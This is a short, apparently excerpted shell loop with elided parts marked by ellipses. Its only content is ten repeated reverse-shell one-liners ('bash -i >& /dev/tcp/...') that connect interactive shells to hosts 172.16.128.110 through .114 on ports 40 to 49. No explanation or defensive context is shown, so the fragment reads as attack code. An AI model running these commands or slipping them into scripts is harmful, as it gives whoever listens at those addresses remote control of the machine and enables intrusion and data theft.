...
do
  ...
  bash -i >& /dev/tcp/172.16.128.110/40 0>&1
  bash -i >& /dev/tcp/172.16.128.111/41 0>&1
  bash -i >& /dev/tcp/172.16.128.112/42 0>&1
  bash -i >& /dev/tcp/172.16.128.113/43 0>&1
  bash -i >& /dev/tcp/172.16.128.114/44 0>&1

  bash -i >& /dev/tcp/172.16.128.110/45 0>&1
  bash -i >& /dev/tcp/172.16.128.111/46 0>&1
  bash -i >& /dev/tcp/172.16.128.112/47 0>&1
  bash -i >& /dev/tcp/172.16.128.113/48 0>&1
  bash -i >& /dev/tcp/172.16.128.114/49 0>&1
done